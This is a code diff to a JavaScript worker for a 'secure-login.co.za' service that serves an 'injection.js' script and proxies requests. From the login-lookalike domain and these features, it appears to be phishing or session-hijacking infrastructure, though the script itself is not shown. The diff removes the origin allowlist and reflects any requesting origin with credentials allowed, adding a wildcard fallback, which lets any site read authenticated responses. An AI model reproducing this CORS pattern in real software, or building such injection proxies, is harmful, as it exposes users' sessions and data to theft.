@@ -9,28 +9,29 @@ const ROOT_DOMAIN = "secure-login.co.za";
 
 export default {
   async fetch(request, env, ctx) {
-    const url = new URL(request.url);
-    const domain = url.hostname; 
+    try {
+      const url = new URL(request.url);
+      const domain = url.hostname;
 
-    // --- CORS HANDLING ---
-    if (request.method === 'OPTIONS') {
-      return handleOptions(request);
-    }
+      // --- CORS HANDLING ---
+      if (request.method === 'OPTIONS') {
+        return handleOptions(request);
+      }
 
-    // Helper to wrap response with CORS headers
-    const respond = (response) => {
-        const corsHeaders = getCorsHeaders(request);
-        const newHeaders = new Headers(response.headers);
-        Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));
+      // Helper to wrap response with CORS headers
+      const respond = (response) => {
+          const corsHeaders = getCorsHeaders(request);
+          const newHeaders = new Headers(response.headers);
+          Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));
 
-        return new Response(response.body, {
-            status: response.status,
-            statusText: response.statusText,
-            headers: newHeaders
-        });
-    };
+          return new Response(response.body, {
+              status: response.status,
+              statusText: response.statusText,
+              headers: newHeaders
+          });
+      };
 
-    // --- 0. SERVE INJECTION SCRIPT ---
+      // --- 0. SERVE INJECTION SCRIPT ---
     if (url.pathname === '/api/js/injection.js') {
         return new Response(INJECTION_SCRIPT, {
             headers: { 'Content-Type': 'application/javascript', 'Access-Control-Allow-Origin': '*' }
@@ -188,11 +189,22 @@ export default {
             return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
           }
         }
-    }
+      }
 
-    return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
-        headers: { 'Content-Type': 'application/json' }
-    });
+      return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
+          headers: { 'Content-Type': 'application/json' }
+      });
+    } catch (err) {
+      // Global error handler to prevent unhandled 500s from dropping CORS headers
+      const corsHeaders = getCorsHeaders(request);
+      return new Response(JSON.stringify({ success: false, error: "Internal Server Error: " + err.message }), {
+          status: 500,
+          headers: {
+              'Content-Type': 'application/json',
+              ...corsHeaders
+          }
+      });
+    }
   }
 };
 
@@ -258,18 +270,21 @@ async function verifySessionToken(request, env) {
 
 function getCorsHeaders(request) {
     const origin = request.headers.get('Origin');
-    const allowedDomain = 'https://secure-login.co.za';
-    const newFrontend = 'https://new.preasx24.co.za';
 
-    if (origin === allowedDomain || origin === newFrontend || (origin && origin.endsWith('.secure-login.co.za'))) {
+    if (origin && origin !== 'null') {
         return {
             'Access-Control-Allow-Origin': origin,
-            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
-            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
             'Access-Control-Allow-Credentials': 'true'
         };
     }
-    return {};
+
+    return {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
+    };
 }
 
 function handleOptions(request) {
